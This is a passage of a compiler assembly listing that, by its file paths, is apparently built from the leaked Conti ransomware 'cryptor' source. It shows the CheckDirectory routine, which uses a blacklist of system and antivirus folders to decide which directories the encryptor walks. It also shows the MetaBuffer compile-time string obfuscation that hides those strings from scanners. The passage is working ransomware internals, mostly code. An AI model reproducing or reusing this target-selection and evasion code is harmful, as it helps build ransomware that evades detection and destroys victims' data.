  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00185	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00189	88 85 c0 00 00
	00		 mov	 BYTE PTR tv154[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0018f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00196	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0019d	5f		 pop	 rdi
  0019e	5d		 pop	 rbp
  0019f	c3		 ret	 0
??0?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?CheckDirectory@@YAHPEB_W@Z
_TEXT	SEGMENT
BlackList$ = 16
Count$ = 132
i$4 = 164
$T5 = 584
$T6 = 632
$T7 = 680
$T8 = 728
$T9 = 776
$T10 = 840
$T11 = 904
$T12 = 984
$T13 = 1032
$T14 = 1080
$T15 = 1144
Directory$ = 1216
?CheckDirectory@@YAHPEB_W@Z PROC			; CheckDirectory, COMDAT

; 41   : {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec c8 04
	00 00		 sub	 rsp, 1224		; 000004c8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 ca 00 00 00	 mov	 ecx, 202		; 000000caH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 e8
	04 00 00	 mov	 rcx, QWORD PTR [rsp+1256]
  0002c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3B0747C_search@cpp
  00033	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 42   : 	LPCWSTR BlackList[] =
; 43   : 	{
; 44   : 
; 45   : 		OBFW(L"tmp"),

  00038	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_17GNJCADOE@?$AAt?$AAm?$AAp@
  0003f	48 8d 8d 48 02
	00 00		 lea	 rcx, QWORD PTR $T5[rbp]
  00046	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
  0004b	48 8b c8	 mov	 rcx, rax
  0004e	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  00053	48 89 45 10	 mov	 QWORD PTR BlackList$[rbp], rax

; 46   : 		OBFW(L"winnt"),

  00057	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1M@OKMIJFDJ@?$AAw?$AAi?$AAn?$AAn?$AAt@
  0005e	48 8d 8d 78 02
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  00065	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
  0006a	48 8b c8	 mov	 rcx, rax
  0006d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  00072	48 89 45 18	 mov	 QWORD PTR BlackList$[rbp+8], rax

; 47   : 		OBFW(L"temp"),

  00076	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_19KEIJKAKM@?$AAt?$AAe?$AAm?$AAp@
  0007d	48 8d 8d a8 02
	00 00		 lea	 rcx, QWORD PTR $T7[rbp]
  00084	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  00089	48 8b c8	 mov	 rcx, rax
  0008c	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00091	48 89 45 20	 mov	 QWORD PTR BlackList$[rbp+16], rax

; 48   : 		OBFW(L"thumb"),

  00095	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1M@KAKDHLGH@?$AAt?$AAh?$AAu?$AAm?$AAb@
  0009c	48 8d 8d d8 02
	00 00		 lea	 rcx, QWORD PTR $T8[rbp]
  000a3	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
  000a8	48 8b c8	 mov	 rcx, rax
  000ab	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  000b0	48 89 45 28	 mov	 QWORD PTR BlackList$[rbp+24], rax

; 49   : 		OBFW(L"$Recycle.Bin"),

  000b4	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BK@FDOENKL@?$AA$?$AAR?$AAe?$AAc?$AAy?$AAc?$AAl?$AAe?$AA?4?$AAB?$AAi?$AAn@
  000bb	48 8d 8d 08 03
	00 00		 lea	 rcx, QWORD PTR $T9[rbp]
  000c2	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
  000c7	48 8b c8	 mov	 rcx, rax
  000ca	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  000cf	48 89 45 30	 mov	 QWORD PTR BlackList$[rbp+32], rax

; 50   : 		OBFW(L"$RECYCLE.BIN"),

  000d3	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BK@KPOPEFAG@?$AA$?$AAR?$AAE?$AAC?$AAY?$AAC?$AAL?$AAE?$AA?4?$AAB?$AAI?$AAN@
  000da	48 8d 8d 48 03
	00 00		 lea	 rcx, QWORD PTR $T10[rbp]
  000e1	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
  000e6	48 8b c8	 mov	 rcx, rax
  000e9	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  000ee	48 89 45 38	 mov	 QWORD PTR BlackList$[rbp+40], rax

; 51   : 		OBFW(L"System Volume Information"),

  000f2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1DE@LIBHJBEH@?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA?5?$AAV?$AAo?$AAl?$AAu?$AAm?$AAe?$AA?5?$AAI@
  000f9	48 8d 8d 88 03
	00 00		 lea	 rcx, QWORD PTR $T11[rbp]
  00100	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
  00105	48 8b c8	 mov	 rcx, rax
  00108	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
  0010d	48 89 45 40	 mov	 QWORD PTR BlackList$[rbp+48], rax

; 52   : 		OBFW(L"Boot"),

  00111	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_19JCAOHIEH@?$AAB?$AAo?$AAo?$AAt@
  00118	48 8d 8d d8 03
	00 00		 lea	 rcx, QWORD PTR $T12[rbp]
  0011f	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  00124	48 8b c8	 mov	 rcx, rax
  00127	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0012c	48 89 45 48	 mov	 QWORD PTR BlackList$[rbp+56], rax

; 53   : 		OBFW(L"Windows"),

  00130	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BA@HLGGGPNC@?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs@
  00137	48 8d 8d 08 04
	00 00		 lea	 rcx, QWORD PTR $T13[rbp]
  0013e	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
  00143	48 8b c8	 mov	 rcx, rax
  00146	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  0014b	48 89 45 50	 mov	 QWORD PTR BlackList$[rbp+64], rax

; 54   : 		OBFW(L"Trend Micro"),

  0014f	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BI@ILHACKKN@?$AAT?$AAr?$AAe?$AAn?$AAd?$AA?5?$AAM?$AAi?$AAc?$AAr?$AAo@
  00156	48 8d 8d 38 04
	00 00		 lea	 rcx, QWORD PTR $T14[rbp]
  0015d	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >
  00162	48 8b c8	 mov	 rcx, rax
  00165	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
  0016a	48 89 45 58	 mov	 QWORD PTR BlackList$[rbp+72], rax

; 55   : 		OBFW(L"perflogs")

  0016e	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BC@HAJBCMBC@?$AAp?$AAe?$AAr?$AAf?$AAl?$AAo?$AAg?$AAs@
  00175	48 8d 8d 78 04
	00 00		 lea	 rcx, QWORD PTR $T15[rbp]
  0017c	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
  00181	48 8b c8	 mov	 rcx, rax
  00184	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
  00189	48 89 45 60	 mov	 QWORD PTR BlackList$[rbp+80], rax

; 56   : 
; 57   : 	};
; 58   : 
; 59   : 	INT Count = sizeof(BlackList) / sizeof(LPWSTR);

  0018d	c7 85 84 00 00
	00 0b 00 00 00	 mov	 DWORD PTR Count$[rbp], 11

; 60   : 	for (INT i = 0; i < Count; i++) {

  00197	c7 85 a4 00 00
	00 00 00 00 00	 mov	 DWORD PTR i$4[rbp], 0
  001a1	eb 0e		 jmp	 SHORT $LN4@CheckDirec
$LN2@CheckDirec:
  001a3	8b 85 a4 00 00
	00		 mov	 eax, DWORD PTR i$4[rbp]
  001a9	ff c0		 inc	 eax
  001ab	89 85 a4 00 00
	00		 mov	 DWORD PTR i$4[rbp], eax
$LN4@CheckDirec:
  001b1	8b 85 84 00 00
	00		 mov	 eax, DWORD PTR Count$[rbp]
  001b7	39 85 a4 00 00
	00		 cmp	 DWORD PTR i$4[rbp], eax
  001bd	7d 23		 jge	 SHORT $LN3@CheckDirec

; 61   : 		if (pStrStrIW(Directory, BlackList[i])) {

  001bf	48 63 85 a4 00
	00 00		 movsxd	 rax, DWORD PTR i$4[rbp]
  001c6	48 8b 54 c5 10	 mov	 rdx, QWORD PTR BlackList$[rbp+rax*8]
  001cb	48 8b 8d c0 04
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  001d2	e8 00 00 00 00	 call	 ?pStrStrIW@@YAPEB_WPEB_W0@Z ; pStrStrIW
  001d7	48 85 c0	 test	 rax, rax
  001da	74 04		 je	 SHORT $LN5@CheckDirec

; 62   : 			return FALSE;

  001dc	33 c0		 xor	 eax, eax
  001de	eb 07		 jmp	 SHORT $LN1@CheckDirec
$LN5@CheckDirec:

; 63   : 		}
; 64   : 	}

  001e0	eb c1		 jmp	 SHORT $LN2@CheckDirec
$LN3@CheckDirec:

; 65   : 
; 66   : 	return TRUE;

  001e2	b8 01 00 00 00	 mov	 eax, 1
$LN1@CheckDirec:

; 67   : }

  001e7	48 8b f8	 mov	 rdi, rax
  001ea	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  001ee	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?CheckDirectory@@YAHPEB_W@Z$rtcFrameData
  001f5	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001fa	48 8b c7	 mov	 rax, rdi
  001fd	48 8d a5 a8 04
	00 00		 lea	 rsp, QWORD PTR [rbp+1192]
  00204	5f		 pop	 rdi
  00205	5d		 pop	 rbp
  00206	c3		 ret	 0
?CheckDirectory@@YAHPEB_W@Z ENDP			; CheckDirectory
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 1a	 sub	 eax, 26
  0002d	6b c0 13	 imul	 eax, eax, 19
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 6b	 imul	 eax, eax, 107		; 0000006bH
  0002d	83 c0 1a	 add	 eax, 26
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 04	 cmp	 QWORD PTR i$1[rbp], 4
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
